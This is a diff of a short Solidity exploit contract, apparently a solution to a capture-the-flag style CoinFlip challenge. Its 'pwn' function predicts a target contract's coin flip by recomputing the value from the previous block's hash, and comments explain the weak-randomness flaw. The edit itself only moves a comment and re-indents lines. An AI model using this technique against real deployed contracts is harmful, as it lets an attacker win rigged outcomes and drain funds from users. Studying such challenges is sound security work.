@@ -1,9 +1,10 @@
 pragma solidity ^0.8;
 
+// Create an interface to interact with flip function in the contract
 interface CoinFlip {
 	function flip(bool _guess) external returns (bool);
 }
-// Create an interface to interact with flip function in the contract
+
 
 
 contract expl {
@@ -13,8 +14,8 @@ contract expl {
 
 	function pwn(bool _guess) public payable {
 		uint256 block_value = uint256(blockhash(block.number - 1)); // The vulnerability is you can create a contract 
-    uint256 coin_flip = block_value / FACTOR;                   // that uses the blockhash to generate the
-                                                                // same random number that the contract will
+                uint256 coin_flip = block_value / FACTOR;                   // that uses the blockhash to generate the
+                                                                            // same random number that the contract will
 		bool side = coin_flip == 1 ? true : false;
 
 		if(side == _guess) {
